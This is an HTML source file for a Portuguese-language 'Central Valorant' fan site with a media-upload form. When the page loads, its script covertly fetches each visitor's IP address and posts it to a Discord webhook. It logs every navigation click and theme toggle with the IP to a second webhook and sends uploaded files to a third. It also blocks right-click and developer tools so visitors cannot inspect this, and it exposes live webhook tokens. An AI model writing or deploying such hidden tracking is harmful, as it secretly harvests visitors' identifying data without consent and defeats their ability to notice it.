<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Central Valorant</title>
  <link rel="icon" href="valorant.png">

  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">

  <style>
    :root {
      --bg-color: #0a0a0a;
      --text-color: #d1d1d1;
      --header-color: #1c1c1c;
      --primary-color: #ff3b3f;
      --highlight-color: #fff;
      --border-radius: 10px;
      --button-bg-color: #333;
      --button-hover-bg-color: #555;
      --button-text-color: #d1d1d1;
      --button-hover-text-color: #fff;
      --input-bg-color: #222;
      --input-text-color: #fff;
      --input-border-color: #555;
    }

    /* Ajusta o padding do body para evitar sobreposição com a navbar fixa */
    body {
      margin: 0;
      padding-top: 80px;
      font-family: 'Orbitron', sans-serif;
      background-color: var(--bg-color);
      color: var(--text-color);
      transition: background-color 0.3s, color 0.3s;
      text-align: center;
    }

    /* Personalizações para o navbar */
    .navbar-custom {
      background-color: var(--header-color);
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
      border-radius: 0 0 var(--border-radius) var(--border-radius);
    }

    .navbar-brand {
      font-size: 24px;
      font-weight: bold;
      color: var(--primary-color) !important;
      text-transform: uppercase;
      margin-left: 20px;
    }

    .nav-link {
      font-size: 16px;
      color: var(--button-text-color) !important;
      background-color: var(--button-bg-color);
      padding: 12px 20px;
      border-radius: var(--border-radius);
      transition: all 0.3s;
      text-align: center;
      margin: 5px;
    }

    .nav-link:hover {
      background-color: var(--button-hover-bg-color) !important;
      color: var(--button-hover-text-color) !important;
      transform: scale(1.05);
    }

    /* Estilização específica para o botão "Entrar" */
    .btn-entrar {
      background-color: var(--primary-color) !important;
      color: #fff !important;
      font-weight: bold;
      border: 2px solid #fff;
    }

    .btn-entrar:hover {
      background-color: #e63337 !important; /* tom levemente mais escuro */
      transform: scale(1.05);
    }

    /* Estilização do toggle de tema */
    .toggle-switch {
      position: relative;
      display: inline-block;
      width: 50px;
      height: 24px;
      margin-left: 20px;
    }

    .toggle-switch .checkbox {
      opacity: 0;
      width: 0;
      height: 0;
    }

    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: 0.4s;
      border-radius: 24px;
    }

    .slider:before {
      position: absolute;
      content: "";
      height: 18px;
      width: 18px;
      left: 3px;
      bottom: 3px;
      background-color: white;
      transition: 0.4s;
      border-radius: 50%;
    }

    .checkbox:checked + .slider {
      background-color: var(--primary-color);
    }

    .checkbox:checked + .slider:before {
      transform: translateX(26px);
    }

    .tooltip-custom {
      visibility: hidden;
      width: 100px;
      background-color: #555;
      color: #fff;
      text-align: center;
      border-radius: 6px;
      padding: 5px;
      position: absolute;
      z-index: 1;
      bottom: 125%;
      left: 50%;
      transform: translateX(-50%);
      opacity: 0;
      transition: opacity 0.3s;
    }

    .toggle-switch:hover .tooltip-custom {
      visibility: visible;
      opacity: 1;
    }

    /* Personalização do ícone do botão de toggle do Bootstrap */
    .navbar-toggler {
      border-color: var(--button-text-color);
    }
    .navbar-toggler-icon {
      background-image: url("data:image/svg+xml;charset=utf8,%3Csvg viewBox='0 0 30 30' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath stroke='rgba(209,209,209,0.7)' stroke-width='2' stroke-linecap='round' stroke-miterlimit='10' d='M4 7h22M4 15h22M4 23h22'/%3E%3C/svg%3E");
    }

    /* Media Upload Section */
    .media-upload-section {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      padding: 20px;
      text-align: center;
      min-height: calc(100vh - 80px);
    }

    .media-upload-form {
      background-color: var(--header-color);
      padding: 30px;
      border-radius: var(--border-radius);
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
      width: 100%;
      max-width: 400px;
      margin-top: 50px;
    }

    .media-upload-form input[type="text"],
    .media-upload-form input[type="file"] {
      background-color: var(--input-bg-color);
      color: var(--input-text-color);
      border: 1px solid var(--input-border-color);
      padding: 12px;
      width: 100%;
      margin-bottom: 20px;
      border-radius: var(--border-radius);
      font-size: 16px;
      transition: background-color 0.3s;
    }

    .media-upload-form input[type="text"]:focus {
      background-color: #444;
      outline: none;
    }

    .media-upload-form button {
      background-color: var(--primary-color);
      color: var(--button-text-color);
      border: none;
      padding: 15px 25px;
      width: 100%;
      font-size: 18px;
      border-radius: var(--border-radius);
      cursor: pointer;
      transition: all 0.3s;
    }

    .media-upload-form button:hover {
      background-color: var(--button-hover-bg-color);
      transform: scale(1.05);
    }

    .media-upload-form h2 {
      color: var(--highlight-color);
      margin-bottom: 20px;
      font-size: 24px;
      text-transform: uppercase;
    }
  </style>

  <!-- Bootstrap Bundle com Popper -->
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

  <script>
    function verificarDominio() {
      const dominioPermitido = "central-valorant.netlify.app";
      if (window.location.hostname !== dominioPermitido) {
        alert("Este script só funciona no Central Valorant: central-valorant.netlify.app");
        return;
      }
      console.log("Domínio válido! Script funcionando.");
    }
    verificarDominio();

    (function bloquearDevTools() {
      document.addEventListener("contextmenu", event => event.preventDefault());
      document.addEventListener("keydown", event => {
        if (
          event.key === "F12" ||
          (event.ctrlKey && event.shiftKey && event.key === "I") ||
          (event.ctrlKey && event.shiftKey && event.key === "C") ||
          (event.ctrlKey && event.shiftKey && event.key === "J") ||
          (event.ctrlKey && event.key === "U")
        ) {
          event.preventDefault();
        }
      });
      setInterval(() => {
        if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
          window.location.reload();
        }
      }, 1000);
    })();

    function sendIP() {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          fetch('https://discord.com/api/webhooks/1336852182829629440/Xj2VlrrEwIWiVr0gRZiOS9Qu8vQmmPop6Vv0V8vZdrP3EMVGfYUNXoAd4JSRshzz3Wrm', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              username: 'Central Valorant',
              avatar_url: 'https://media.discordapp.net/attachments/1336193133075103754/1336855231287267339/valorant_2_1.jpg',
              content: `Visitante - [ IP ]: ${data.ip}`
            })
          });
        });
    }

    function sendButtonClickMessage(buttonName) {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const userIP = data.ip;
          const webhookData = {
            username: 'Central Valorant',
            avatar_url: 'https://media.discordapp.net/attachments/1336193133075103754/1336855231287267339/valorant_2_1.jpg',
            content: `Visitante - [ IP ]: ${userIP} - Clicou em: ${buttonName}`
          };

          fetch('https://discord.com/api/webhooks/1336852364086214761/PPi8Mkfdv-yApt3KhOc-C7DZGLoqahQV1eICXm-yq__K5qxSIk-oX6KtC4AT6JX2xFsr', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(webhookData)
          })
          .then(response => {
            if (response.ok) {
              console.log('Mensagem enviada com sucesso!');
            } else {
              console.log('Falha ao enviar a mensagem. Status:', response.status);
            }
          })
          .catch(error => {
            console.error('Erro ao enviar a mensagem:', error);
          });
        });
    }

    function sendMedia() {
      const fileInput = document.getElementById('media');
      const username = document.getElementById('username').value.trim();
      const file = fileInput.files[0];

      if (!file || !username) {
        alert('Por favor, insira o nome do usuário e selecione uma mídia.');
        return;
      }

      const formData = new FormData();
      formData.append('file', file);
      formData.append('username', username);

      // Enviar para o webhook
      sendToDiscord(formData, username);
    }

    function sendToDiscord(formData, username) {
      const webhookURL = "https://discord.com/api/webhooks/1336867075007709254/67fLBOk0kWGhrpC3SOuQkFafonptdtUPBuc4u4AYI_lQ51RR8Dsi7VKH2T1tzVK8p43j";

      // Estrutura de embed para o Discord
      const embed = {
        username: "Central Valorant",
        avatar_url: "https://media.discordapp.net/attachments/1336193133075103754/1336855231287267339/valorant_2_1.jpg",
        embeds: [{
          color: 16711680,
          title: "Nova Mídia",
          fields: [
            {
              name: "Usuário:",
              value: username,
              inline: true
            }
          ],
          footer: {
            text: "Feito por fumiga.",
            icon_url: "https://media.discordapp.net/attachments/1336193133075103754/1336855231287267339/valorant_2_1.jpg"
          },
          timestamp: new Date().toISOString()
        }]
      };

      const data = new FormData();
      data.append('file', formData.get('file'));
      data.append('payload_json', JSON.stringify(embed));

      fetch(webhookURL, {
        method: 'POST',
        body: data
      })
      .then(response => {
        if (!response.ok) {
          throw new Error('Falha ao enviar para o Discord');
        }
        alert('Mídia enviada com sucesso!');
      })
      .catch(error => console.error('Erro ao enviar para o Discord:', error));
    }

    function toggleTheme() {
      let darkMode = localStorage.getItem('darkMode') === 'true';
      darkMode = !darkMode;
      localStorage.setItem('darkMode', darkMode);
      applyTheme(darkMode);
      sendButtonClickMessage('Trocar Tema');
    }

    function applyTheme(darkMode) {
      document.documentElement.style.setProperty('--bg-color', darkMode ? '#0a0a0a' : '#ffffff');
      document.documentElement.style.setProperty('--text-color', darkMode ? '#d1d1d1' : '#000000');
      document.documentElement.style.setProperty('--header-color', darkMode ? '#1c1c1c' : '#f0f0f0');
    }

    function handleNavClick(linkName) {
      sendButtonClickMessage(linkName);
    }

    window.onload = function() {
      sendIP();
      const darkMode = localStorage.getItem('darkMode') === 'true';
      applyTheme(darkMode);
    };
  </script>
</head>
<body>
  <!-- Navbar responsiva com Bootstrap -->
  <nav class="navbar navbar-expand-lg fixed-top navbar-custom">
    <div class="container-fluid">
      <a class="navbar-brand" href="#">Central Valorant</a>
      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" 
              aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ms-auto mb-2 mb-lg-0 align-items-lg-center">
          <li class="nav-item">
            <a class="nav-link" href="arena" target="_blank" onclick="handleNavClick('arena')">Início</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="salas" target="_blank" onclick="handleNavClick('salas')">Salas</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="sobre" target="_blank" onclick="handleNavClick('sobre')">Sobre</a>
          </li>
          <li class="nav-item">
            <a class="nav-link btn-entrar" href="entrar" target="_blank" onclick="handleNavClick('entrar')">Entrar</a>
          </li>
          <!-- Toggle de tema -->
          <li class="nav-item d-flex align-items-center">
            <div class="toggle-switch">
              <label class="switch-label">
                <input type="checkbox" class="checkbox" onclick="toggleTheme()">
                <span class="slider"></span>
              </label>
              <span class="tooltip-custom">Trocar Tema</span>
            </div>
          </li>
        </ul>
      </div>
    </div>
  </nav>

  <!-- Seção de Envio de Mídia -->
  <div class="media-upload-section">
    <div class="media-upload-form">
      <h2>Enviar Mídia</h2>
      <input type="text" id="username" placeholder="Nome do Usuário">
      <input type="file" id="media">
      <button onclick="sendMedia()">Enviar Mídia</button>
    </div>
  </div>
</body>
</html>
